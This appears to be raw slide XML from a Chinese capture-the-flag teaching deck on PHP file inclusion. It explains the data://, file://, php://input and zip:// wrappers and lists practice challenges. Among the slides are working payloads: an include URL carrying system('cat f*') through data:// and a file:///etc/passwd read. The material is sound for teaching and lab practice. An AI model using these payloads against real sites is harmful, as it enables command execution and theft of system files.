        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>?file=data://text/plain</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>               </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:buClrTx/>
              <a:buSzTx/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800"/>
              <a:t>与</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>php://filter不一样的是可以直接在后面接上需要执行的php代码</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:sym typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="文本框 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1001395" y="4309110"/>
            <a:ext cx="7400290" cy="2428240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>1、data://text/plain,</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>http://127.0.0.1/include.php?file=data://text/plain,&lt;?php system('cat f*')</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>?&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>2、data://text/plain;base64,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>base64</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>编码</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>web37</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>web38</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>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web78</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>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 file://</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>用于访问本地文件系统，并且不受allow_url_fopen，allow_url_include影响</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>file://协议主要用于访问文件(绝对路径、相对路径以及网络路径)</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>比如：http://www.xx.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>?file=file:///etc/passsword</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="文本框 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="728980" y="5121275"/>
            <a:ext cx="6096000" cy="368300"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>http://iwebsec.com:81/fi/09.php</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4 php://</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>在allow_url_fopen，allow_url_include都关闭的情况下可以正常使用</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>php://作用为访问输入输出流</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5 php://input</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。</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38" name="组合 37"/>
          <p:cNvGrpSpPr/>
          <p:nvPr userDrawn="1">
            <p:custDataLst>
              <p:tags r:id="rId1"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="152827" y="104775"/>
            <a:ext cx="11901060" cy="268446"/>
            <a:chOff x="152827" y="104775"/>
            <a:chExt cx="11901060" cy="268446"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="39" name="等腰三角形 38"/>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0" name="等腰三角形 3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1" name="等腰三角形 4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sp>
          <p:nvSpPr>
            <p:cNvPr id="42" name="等腰三角形 4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grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="5" name="组合 4"/>
          <p:cNvGrpSpPr/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId6"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="9115160" y="0"/>
            <a:ext cx="3083190" cy="4178868"/>
            <a:chOff x="9115160" y="0"/>
            <a:chExt cx="3083190" cy="4178868"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:cxnSp>
          <p:nvCxnSpPr>
            <p:cNvPr id="6" name="直接连接符 5"/>
            <p:cNvCxnSpPr/>
            <p:nvPr>
              <p:custDataLst>
                <p:tags r:id="rId7"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1193025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8"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1166214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9"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1152809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0"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1125999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099188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911516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965136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14"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1018757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15"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="924921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6"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="991947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7"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1045568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18"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1072378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9"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1219835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custDataLst>
                <p:tags r:id="rId20"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1206430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21"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1179620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22"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1139404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23"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1112594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24"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="938326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25"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="9785420"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26"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="10321628"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27"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="951731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28"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="10053524"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29"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="10589732"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30"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="10857836" y="0"/>
              <a:ext cx="0" cy="4178868"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="12700">
              <a:solidFill>
                <a:schemeClr val="lt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32" name="椭圆 31"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId31"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7490369" y="948895"/>
            <a:ext cx="3842284" cy="3842284"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="6604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3" name="任意多边形: 形状 19"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId32"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6352684" y="2805790"/>
            <a:ext cx="5839318" cy="4052211"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="connsiteX0" fmla="*/ 3152097 w 5400187"/>
              <a:gd name="connsiteY0" fmla="*/ 0 h 3747475"/>
              <a:gd name="connsiteX1" fmla="*/ 5380966 w 5400187"/>
              <a:gd name="connsiteY1" fmla="*/ 923228 h 3747475"/>
              <a:gd name="connsiteX2" fmla="*/ 5400187 w 5400187"/>
              <a:gd name="connsiteY2" fmla="*/ 944376 h 3747475"/>
              <a:gd name="connsiteX3" fmla="*/ 5400187 w 5400187"/>
              <a:gd name="connsiteY3" fmla="*/ 3747475 h 3747475"/>
              <a:gd name="connsiteX4" fmla="*/ 57954 w 5400187"/>
              <a:gd name="connsiteY4" fmla="*/ 3747475 h 3747475"/>
              <a:gd name="connsiteX5" fmla="*/ 16274 w 5400187"/>
              <a:gd name="connsiteY5" fmla="*/ 3474380 h 3747475"/>
              <a:gd name="connsiteX6" fmla="*/ 0 w 5400187"/>
              <a:gd name="connsiteY6" fmla="*/ 3152096 h 3747475"/>
              <a:gd name="connsiteX7" fmla="*/ 3152097 w 5400187"/>
              <a:gd name="connsiteY7" fmla="*/ 0 h 374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0187" h="3747475">
                <a:moveTo>
                  <a:pt x="3152097" y="0"/>
                </a:moveTo>
                <a:cubicBezTo>
                  <a:pt x="4022524" y="0"/>
                  <a:pt x="4810549" y="352811"/>
                  <a:pt x="5380966" y="923228"/>
                </a:cubicBezTo>
                <a:lnTo>
                  <a:pt x="5400187" y="944376"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5400187" y="3747475"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="57954" y="3747475"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16274" y="3474380"/>
                </a:lnTo>
                <a:cubicBezTo>
                  <a:pt x="5513" y="3368416"/>
                  <a:pt x="0" y="3260900"/>
                  <a:pt x="0" y="3152096"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="0" y="1411241"/>
                  <a:pt x="1411242" y="0"/>
                  <a:pt x="3152097" y="0"/>
                </a:cubicBezTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:schemeClr val="lt1">
              <a:lumMod val="85000"/>
              <a:alpha val="99000"/>
            </a:schemeClr>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="6604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4" name="任意多边形: 形状 17"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId33"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="9411512" cy="6857999"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="connsiteX0" fmla="*/ 0 w 9411512"/>
              <a:gd name="connsiteY0" fmla="*/ 0 h 6857999"/>
              <a:gd name="connsiteX1" fmla="*/ 9066539 w 9411512"/>
              <a:gd name="connsiteY1" fmla="*/ 0 h 6857999"/>
              <a:gd name="connsiteX2" fmla="*/ 9141589 w 9411512"/>
              <a:gd name="connsiteY2" fmla="*/ 221804 h 6857999"/>
              <a:gd name="connsiteX3" fmla="*/ 9411512 w 9411512"/>
              <a:gd name="connsiteY3" fmla="*/ 2007174 h 6857999"/>
              <a:gd name="connsiteX4" fmla="*/ 6999850 w 9411512"/>
              <a:gd name="connsiteY4" fmla="*/ 6818295 h 6857999"/>
              <a:gd name="connsiteX5" fmla="*/ 6944016 w 9411512"/>
              <a:gd name="connsiteY5" fmla="*/ 6857999 h 6857999"/>
              <a:gd name="connsiteX6" fmla="*/ 0 w 9411512"/>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1512" h="6857999">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="9066539" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9141589" y="221804"/>
                </a:lnTo>
                <a:cubicBezTo>
                  <a:pt x="9317011" y="785802"/>
                  <a:pt x="9411512" y="1385452"/>
                  <a:pt x="9411512" y="2007174"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="9411512" y="3975961"/>
                  <a:pt x="8463877" y="5723415"/>
                  <a:pt x="6999850" y="6818295"/>
                </a:cubicBezTo>
                <a:lnTo>
                  <a:pt x="6944016" y="6857999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="6857999"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:schemeClr val="lt1">
              <a:alpha val="99000"/>
            </a:schemeClr>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="355600" dist="381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35" name="直接连接符 34"/>
          <p:cNvCxnSpPr/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId34"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1140739" y="3168621"/>
            <a:ext cx="0" cy="520499"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="28575" cmpd="sng">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35"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066165" y="5654675"/>
            <a:ext cx="0" cy="51689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36"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1200150" y="5654675"/>
            <a:ext cx="0" cy="51689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itle 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId37"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1371611" y="1523880"/>
            <a:ext cx="6400851" cy="381022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31800" lvl="0" indent="-431800" algn="l" fontAlgn="ctr">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buFont typeface="+mn-ea"/>
              <a:buAutoNum type="ea1JpnChsDbPeriod"/>
            </a:pPr>
            <a:r>
              <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input必须以post请求</a:t>
            </a:r>
            <a:endPar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431800" lvl="0" indent="-431800" algn="l" fontAlgn="ctr">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buFont typeface="+mn-ea"/>
              <a:buAutoNum type="ea1JpnChsDbPeriod"/>
            </a:pPr>
            <a:r>
              <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enctype=“multipart/form-data” 的时候 php://input 是无效的</a:t>
            </a:r>
            <a:endPar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431800" lvl="0" indent="-431800" algn="l" fontAlgn="ctr">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buFont typeface="+mn-ea"/>
              <a:buAutoNum type="ea1JpnChsDbPeriod"/>
            </a:pPr>
            <a:r>
              <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allow_url_include=on</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2600" spc="18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38"/>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6 zip://</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>zip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。</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838200" y="2981960"/>
            <a:ext cx="10515600" cy="3876040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="直角双向箭头 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="13560000">
            <a:off x="4134485" y="1946275"/>
            <a:ext cx="1551305" cy="153670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2758440" y="1068705"/>
            <a:ext cx="4192905" cy="8413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2887345" y="1305560"/>
            <a:ext cx="4064000" cy="645160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>对应</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>php.ini</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>配置文件所对应的两个选项，即</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>使用条件</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通常php.ini的位置在：</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="zh-CN" altLang="en-US"/>
            </a:br>
            <a:br>
              <a:rPr lang="zh-CN" altLang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>     /etc目录下或/usr/local/lib目录下。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>新建php文件，写入如下代码</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>&lt;?php</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>echo phpinfo();</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>然后在浏览器访问该页面，搜索php.ini，</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100" name="图片 99"/>
          <p:cNvPicPr/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId1"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1567180" y="309880"/>
            <a:ext cx="6926580" cy="656209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1780" y="358140"/>
            <a:ext cx="6096000" cy="368300"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>[极客大挑战 2019]Secret File</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="文本框 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="407670" y="956945"/>
            <a:ext cx="6096000" cy="368300"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>web79 </a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="文本框 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId1"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="913765" y="2788920"/>
            <a:ext cx="6096000" cy="368300"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>fileclude</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>攻防</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="文本框 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="271780" y="3208020"/>
            <a:ext cx="6096000" cy="368300"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>fileinclude</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t> coo</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="文本框 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7659370" y="262890"/>
            <a:ext cx="4064000" cy="368300"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>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14" name="组合 13"/>
          <p:cNvGrpSpPr/>
          <p:nvPr userDrawn="1">
            <p:custDataLst>
              <p:tags r:id="rId1"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="152827" y="104775"/>
            <a:ext cx="11901060" cy="268446"/>
            <a:chOff x="152827" y="104775"/>
            <a:chExt cx="11901060" cy="268446"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
